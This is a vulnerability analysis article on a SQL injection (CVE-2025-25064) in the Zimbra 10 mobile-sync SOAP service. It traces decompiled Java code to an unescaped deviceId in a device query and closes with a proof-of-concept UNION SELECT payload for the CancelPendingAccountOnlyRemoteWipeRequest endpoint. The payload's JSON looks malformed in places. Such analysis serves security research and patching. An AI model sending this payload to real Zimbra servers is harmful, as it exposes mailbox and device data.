### 1.  Title
Zimbra 10 SQL Injection (CVE-2025-25064) Analysis Article

### 2. Product version
tested on Zimbra 10

### 3.  Root Cause
```java
// lib/ext/zimbrasync/zm-sync-store/com/zimbra/zimbrasync/service/ZimbraSyncService.java
package com.zimbra.zimbrasync.service;

import com.zimbra.common.soap.SyncConstants;
import com.zimbra.soap.DocumentDispatcher;
import com.zimbra.soap.DocumentService;

public class ZimbraSyncService implements DocumentService {
    public void registerHandlers(DocumentDispatcher dispatcher) {
        dispatcher.registerHandler(SyncConstants.ALLOW_DEVICE_REQUEST, new AllowDevice());
        dispatcher.registerHandler(SyncConstants.BLOCK_DEVICE_REQUEST, new BlockDevice());
        dispatcher.registerHandler(SyncConstants.GET_DEVICE_STATUS_REQUEST, new GetDeviceStatus());
        dispatcher.registerHandler(SyncConstants.REMOVE_DEVICE_REQUEST, new RemoveDevice());
        dispatcher.registerHandler(SyncConstants.SUSPEND_DEVICE_REQUEST, new SuspendDevice());
        dispatcher.registerHandler(SyncConstants.QUARANTINE_DEVICE_REQUEST, new QuarantineDevice());
        dispatcher.registerHandler(SyncConstants.RESUME_DEVICE_REQUEST, new ResumeDevice());
        dispatcher.registerHandler(SyncConstants.REMOTE_WIPE_REQUEST, new RemoteWipe());
        dispatcher.registerHandler(SyncConstants.CANCEL_PENDING_REMOTE_WIPE_REQUEST, new CancelPendingRemoteWipe());
        dispatcher.registerHandler(SyncConstants.ACCOUNT_ONLY_REMOTE_WIPE_REQUEST, new AccountOnlyRemoteWipe());
        dispatcher.registerHandler(SyncConstants.CANCEL_PENDING_ACCOUNT_ONLY_REMOTE_WIPE_REQUEST, new CancelPendingAccountOnlyRemoteWipe()); // [0]
    }
}
```
If you see the `[0]`, register the endpoint using the `CancelPendingAccountOnlyRemoteWipe` Wool registerHandler method.

```java
public static final String E_CANCEL_PENDING_ACCOUNT_ONLY_REMOTE_WIPE_REQUEST = "CancelPendingAccountOnlyRemoteWipeRequest"; // [1]
```

If you look at `[1]` you can see that url mapped to the registered endpoint is `/CancelPendingAccountOnlyRemoteWipeRequest`.

```java
// lib/ext/zimbrasync/zm-sync-store/com/zimbra/zimbrasync/service/CancelPendingAccountOnlyRemoteWipe.java
package com.zimbra.zimbrasync.service;

import com.zimbra.common.service.ServiceException;
import com.zimbra.common.soap.Element;
import com.zimbra.common.soap.SyncConstants;
import com.zimbra.cs.account.Account;
import com.zimbra.cs.mailbox.MailboxManager;
import com.zimbra.soap.DocumentHandler;
import com.zimbra.soap.ZimbraSoapContext;
import com.zimbra.zimbrasync.Device;
import com.zimbra.zimbrasync.util.SyncUtil;
import java.util.Map;

public class CancelPendingAccountOnlyRemoteWipe extends DocumentHandler {
    public Element handle(Element request, Map<String, Object> context) throws ServiceException {
        ZimbraSoapContext zsc = getZimbraSoapContext(context);
        Account account = getRequestedAccount(zsc);
        if (!canAccessAccount(zsc, account)) {
            throw ServiceException.PERM_DENIED("can not access account");
        }
        String deviceId = request.getElement("device").getAttribute("id"); // [2]
        Device device = Device.getDevice(Integer.valueOf(MailboxManager.getInstance().getMailboxByAccount(account).getId()), deviceId); // [3]
        if (SyncUtil.isUserSyncActionAllowed("CancelPendingAccountOnlyRemoteWipeRequest", device.getStatus(), device.getLastUpdatedBy())) {
            device.cancelPendingAccountOnlyRemoteWipe("User");
            Element response = zsc.createElement(SyncConstants.CANCEL_PENDING_ACCOUNT_ONLY_REMOTE_WIPE_RESPONSE);
            GetDeviceStatus.encodeDeviceStatus(response, device);
            return response;
        }
        throw ServiceException.PERM_DENIED("You don't have permission to cancel pending account only wipe");
    }
}
```

If you look at [2], define the variable `deviceId` using your input and use it to call the method `Device.getDevice` if you look at [3].

```java
public static Device getDevice(Integer mailboxId, String deviceId) throws ServiceException {
    List<Device> devices = getDevices(mailboxId, deviceId, null, true); //[4]
    if (devices.size() == 0) {
        throw ZimbraSyncServiceException.NO_SUCH_DEVICE();
    }
    if ($assertionsDisabled || devices.size() == STATUS_OK) {
        return devices.get(STATUS_POLICY_NEEDPROV);
    }
    throw new AssertionError();
}
```

If you look at `[4]`, again the `getDevices` method is called, and there is no verification of the user input value `deviceId` variable.

```java
// lib/ext/zimbrasync/zm-sync-store/com/zimbra/zimbrasync/service/CancelPendingAccountOnlyRemoteWipe.java
public static List<Device> getDevices(Integer mailboxId, String deviceId, Byte status, Boolean incluedeDeletedByUser, int offset, int limit, String deviceName, String deviceType, String deviceLastUsed, String deviceSyncVersion, Boolean filterDevicesByAnd, Boolean includeMatchingDevices) throws ServiceException {
    List<Device> devices = new ArrayList<>();
    DbPool.DbConnection conn = STATUS_POLICY_NEEDPROV;
    PreparedStatement stmt = STATUS_POLICY_NEEDPROV;
    ResultSet rs = STATUS_POLICY_NEEDPROV;
    String queryAppendString = filterDevicesByAnd.booleanValue() ? " AND" : " OR";
    Boolean isQueryBeingCreated = false;
    StringBuilder query = new StringBuilder();
    query.append("SELECT device_id, device_type, user_agent, protocol_version, provisionable, status, policy_key, recovery_password, first_req_received, last_policy_update, remote_wipe_req, remote_wipe_ack, policy_values, last_used_date, deleted_by_user, model, imei, friendly_name, os, os_language, phone_number, unapproved_appl_list, approved_appl_list, mailbox_id, mobile_operator, last_updated_by, update_time FROM mobile_devices");
    if (mailboxId != null && mailboxId.intValue() > 0) {
        query.append(" WHERE");
        query.append(" mailbox_id = ?");
        isQueryBeingCreated = true;
    }
    if (!StringUtil.isNullOrEmpty(deviceId)) {
        if (isQueryBeingCreated.booleanValue()) {
            query.append(queryAppendString);
        } else {
            query.append(" WHERE");
            isQueryBeingCreated = true;
        }
        if (includeMatchingDevices.booleanValue()) {
            Pattern pattern = Pattern.compile("(?<!\\.)\\*");
            Matcher matcher = pattern.matcher(deviceId);
            query.append(" device_id").append(" REGEXP '^" + matcher.replaceAll(".*") + "$'");
        } else {
            query.append(" device_id = '" + deviceId + "'"); // [5]
        }
    }
```

If you look at [5], there is no verification of variable `deviceId` and no escape is made, and it is added to the query variable SQL Injection is possible.

### 4. POC

By sending a request to the endpoint that uses getDevice with the following payload, an SQL injection is triggered.
`{"Body":{"CancelPendingAccountOnlyRemoteWipeRequest":{"_jsns":"urn:zimbraSync","device":{"id":"aaaa\'union select 111,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,18,20,21,22,23,24,25,26,111}}}}`


This article was written in collaboration with NGA Thank you

PS. We actually found this a long time ago but did not report it
